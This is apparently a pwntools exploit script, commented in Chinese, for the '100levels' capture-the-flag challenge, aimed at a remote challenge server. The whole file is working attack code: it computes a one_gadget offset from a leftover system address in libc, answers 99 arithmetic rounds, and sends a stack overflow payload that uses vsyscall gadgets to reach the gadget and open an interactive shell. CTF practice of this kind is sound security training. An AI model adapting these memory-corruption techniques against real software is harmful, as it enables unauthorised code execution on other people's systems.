from pwn import *

context.log_level = 'DEBUG'
context.binary = ELF('../file/100levels')

# 本地使用的是libc2.35，其中发现的one_gadget的约束条件很难满足
# p = process('../file/100levels')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
# one_gadget_offset = 0x50a37

p = remote('61.147.171.105', '58481')
libc = ELF('../file/libc.so')
one_gadget_offset = 0x4526a

pause()

system_offset = libc.sym['system'] # 0x45390
offset = one_gadget_offset - system_offset

# 在栈中写入system地址
p.sendlineafter(b'Choice:\n', b'2')

# 进入level
p.sendlineafter(b'Choice:\n', b'1')
p.sendlineafter(b'How many levels?\n', b'0')

# 这里的offset会和栈中的system地址相加，结果就等于one_gadget的地址
p.sendlineafter(b'Any more?\n', str(offset).encode())

# 完成99轮递归调用，让栈回到刚进入level时的状态
for i in range(99):
    p.recvuntil(b'Question: ')
    a = int(p.recvuntil(b' '))
    p.recvuntil(b'* ')
    b = int(p.recvuntil(b' '))
    p.sendlineafter(b'Answer:', str(a*b).encode())

# 用vsyscall跳过24个字节的栈空间，然后执行one_gadget
vsyscall = 0xffffffffff600000
payload = b'a' * 0x38 + p64(vsyscall) * 3
p.sendafter(b'Answer:', payload)

p.interactive()